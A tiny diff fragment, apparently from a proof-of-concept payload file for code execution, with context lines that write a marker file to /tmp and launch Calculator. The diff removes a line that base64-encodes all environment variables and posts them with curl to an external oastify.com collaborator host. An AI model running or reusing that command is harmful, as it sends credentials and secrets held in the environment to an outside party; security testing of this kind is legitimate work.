@@ -2,4 +2,3 @@
 echo "amal_was_here" > /tmp/pwnd
 calc.exe
 open -a Calculator.app
-curl -d "$(env | base64)" https://s3wjq0i4n6pdviaj69tpcrasojuai16q.oastify.com
